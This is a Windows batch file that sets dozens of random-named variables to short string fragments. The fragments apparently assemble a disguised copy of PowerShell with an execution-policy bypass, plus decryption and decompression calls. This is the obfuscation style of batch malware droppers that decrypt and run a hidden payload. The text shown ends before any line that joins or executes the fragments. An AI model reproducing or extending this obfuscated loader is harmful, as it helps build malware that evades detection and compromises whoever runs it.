@echo off
set "PMzxYkLfeY=ll"
set "pDcPDPZhez=:\"
set "zYtZRkMICT=rS"
set "lIBsJRUjqj=we"
set "RWEPSaVvzi=we"
set "fShAgOWZjG=Wi"
set "HZIIjTLEpt=he"
set "WRQhINMXpT=xe"
set "VpjfLFSovF=in"
set "eNwhKcIAzV=st"
set "WQAygfENLO=y "
set "ozwZHdCHYG=do"
set "aCRQVRwntL=po"
set "ypbaFIVFwm=rs"
set "ddjGzYsMoe=he"
set "QdzqZEQIbW=s\"
set "qTuvGxubvq=co"
set "khRSQdNtPF=em"
set "PGDKhPkDPf=py"
set "wXiiKJJqSO= C"
set "fYzwVKBRkm=.e"
set "CbkOjeWXYY=32"
set "NKglIcTmFj=Sy"
set "gpUXZbtYEu=0\"
set "AjCjWlZTjQ=1."
set "rriXmcGsFX=\W"
set "wvOSKnSecD=Po"
set "kyEvuxjkRL=ll"
set "OdjGalEOhr=ow"
set "fLCADSYTFN=ws"
set "gnKPktKmKW=nd"
set "YPCvoxbOaA=\v"
set "IihutMPDbv= /"
set "BpOiqLSGsy=cd"
set "iYRhebjQpJ= %~dp0"
set "MKecXQmnfx=Iog "
set "ihYAhyPLqn=;$rR"
set "UPXcBihmUp=$JtC"
set "vQGJIsnnzh=AZef"
set "AKIUcmshEU=rAZe"
set "KkLuymhmlN=.Cre"
set "VTlJRhxAnD=urit"
set "LcwTwHvoFB=tsWi"
set "OeVKhpVNRw=ke($"
set "VBChATCHop=pres"
set "DgnQSlzZdp=Disp"
set "YkDpvVhQhP=.Key"
set "kWpeaKDDcE=and "
set "KttysJwXvC=gth)"
set "uFjsBtAiWN=bypa"
set "smMTMpmrHv=  $R"
set "mSQNpgFCdU=onve"
set "vtrtiHUEFC=oint"
set "jTvlmhPIPO=.Dis"
set "gHBgrIJBmq=w.En"
set "ckcuqmxnVQ=736u"
set "IlfzXfoVcQ=tion"
set "VzgggEDJEw=;$uA"
set "IIBirXiXRk=LX);"
